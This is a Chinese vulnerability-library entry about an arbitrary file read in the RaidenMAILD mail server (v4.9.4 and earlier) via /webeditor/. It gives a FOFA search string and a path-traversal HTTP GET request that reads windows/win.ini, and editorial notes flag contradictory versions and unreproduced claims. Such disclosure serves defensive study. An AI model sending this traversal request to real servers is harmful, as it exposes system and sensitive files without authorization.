---
source: "wy876 漏洞文库"
title: "RaidenMAILD邮件服务器v.4.9.4存在任意文件读取漏洞"
product: "RaidenMAILD"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Version range contradictory; auth unknown"
fofa_unverified: "RaidenMAILD Mail Server <= 4.9.4"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-9095eff4b3ee055909c3163d"
entity_id: "ve-9095eff4b3ee055909c3163d"
schema_version: "1"
---

# RaidenMAILD邮件服务器v.4.9.4存在任意文件读取漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Version range contradictory; auth unknown
- 证据范围：Single traversal GET, no result/evidence, blank Host

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。
- 原所谓 FOFA 值只是产品/版本文字，移到 fofa_unverified，避免被当作可执行资产查询。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- <=4.9.4 in narrative vs<4.9.4 in impact list; boundary contradictory
- fofa metadata/body contain product+version prose rather than valid structured query
- Normalize Raiden/Raden spelling and remove empty font/feature items
- No advisory/date/authentication conditions

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);"> </font>RaidenMAILD是一款稳定、安全、高性能的邮件服务器软件，适用于中小型企业、机构以及个人用户搭建自己的邮件系统。该产品 Raden MAILD Mail Server v.4.9.4及以前版本中存在任意文件读取漏洞，允许远程攻击者通过/webeditor/组件获取敏感信息。

# 二、影响版本
+ RaidenMAILD<4.9.4

# 三、资产测绘
+ fofa`RaidenMAILD Mail Server <= 4.9.4`
+ 特征


# 四、漏洞复现
```http
GET /webeditor/../../../windows/win.ini HTTP/1.1
Host: 
Cache-Control: max-age=0
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gyn1em2xgen6fhmc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
